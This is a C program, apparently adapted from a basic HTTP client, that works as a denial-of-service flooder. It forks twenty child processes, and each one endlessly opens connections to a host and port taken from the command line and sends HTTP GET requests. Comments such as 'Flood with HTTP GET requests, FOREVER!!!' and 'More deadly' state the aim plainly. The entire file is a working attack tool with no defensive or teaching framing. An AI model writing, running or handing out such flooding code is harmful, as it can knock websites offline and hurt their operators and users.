#include <sys/types.h>
#include <stdio.h> /* for printf() and fprintf() */
#include <sys/socket.h> /* for socket(), connect(), send(), and recv() */
#include <arpa/inet.h> /* for sockaddr_in and inet_addr() */
#include <stdlib.h> /* for atoi() and exit() */
#include <string.h> /* for memset() */
#include <unistd.h> /* for close() */
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <errno.h>
#define RCVBUFSIZE 100000 /* Size of receive buffer */
#define PROCESSCOUNT 20 /* How many times to fork the process */
int errno;
void DieWithError(char *errorMessage); /* Error handling function */ 

//define getaddrinfo struct
    int getaddrinfo(const char *node,
                    const char *service,
                    const struct addrinfo *hints,
                    struct addrinfo **res);

int main(int argc, char* argv[])
{
    //get user input
    char *url;
    char *port;

    if(argc == 3)
    {
        url = argv[1];
        port = argv[2];
    }
    else if(argc == 4 && strcmp(argv[1], "-p") == 0)
    {
        url = argv[2];
        port = argv[3];
    }
    else
    {
        printf("Usage: %s [-options] server_url port_number\n", argv[0]);
        exit(1);
    }

    //If the URL contains a filepath, get it
    int slashPos;
    char defaultFilepath[] = "index.html";
    char* filepath = &defaultFilepath[0];
    if(strchr(url, '/') != NULL)
    {
        slashPos = (int)(strchr(url, '/') - url);
        filepath = &url[slashPos + 1];
        url[slashPos] = '\0';
    }

    //Flood with HTTP GET requests, FOREVER!!!
    /* More deadly if we spawn this process a lot of times using fork()! */
    printf("Spawning the process %d times!\n", PROCESSCOUNT);

	for (int i = 0; i < PROCESSCOUNT; i++) {
		pid_t pid = fork();

		if (pid < 0) {
			perror("fork() failed");
			exit(1);
		} else if (pid == 0) {
			// Child process: break out of loop and continue HTTP logic
			break;
		} else {
			// Parent process
			// waitpid(pid, NULL, 0); // wait for each child
		}
	}
    
    if (getppid() != getpid()) { // Make sure the request loop is only run by children
		for(;;) {
			//call getaddrinfo()
			int status;
			struct addrinfo hints;
			struct addrinfo *servinfo;

			memset(&hints, 0, sizeof(hints));
			hints.ai_family = AF_INET;
			hints.ai_socktype = SOCK_STREAM;

			if((status = getaddrinfo(url, port, &hints, &servinfo)) != 0)
			{
				DieWithError("getaddrinfo() failed\n");
				exit(1);
			}

			//call socket()
			int sockfd;
			if((sockfd = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol)) < 0)
			{
				DieWithError("socket() failed\n");
				close(sockfd);
				exit(1);
			}

			//before calling connect(), get time of day
			struct timeval t0;
			gettimeofday(&t0, NULL);

			//call connect()
			int connect_status;
			if((connect_status = connect(sockfd, servinfo->ai_addr, servinfo->ai_addrlen)) < 0)
			{
				DieWithError("connect() failed");
				close(sockfd);
				exit(1);
			}
			freeaddrinfo(servinfo);

			//write a HTTP message
			char request[strlen(url) + strlen(filepath) + 40];
			sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", filepath, url);
			printf("-----------------HTTP REQUEST SENT-----------------\n");
			printf("%s", request);

			//flood server with HTTP messages
			int len, bytes_sent;
			len = strlen(request);
			if((bytes_sent = send(sockfd, request, len, 0)) < 0)
			{
				DieWithError("send() failed");
				close(sockfd);
				exit(1);
			}
		}
	}

    return 0;
}

void DieWithError(char *errorMessage) //display error message with error code
{
    printf("%s\nerror code: %d\n", errorMessage, errno);
}
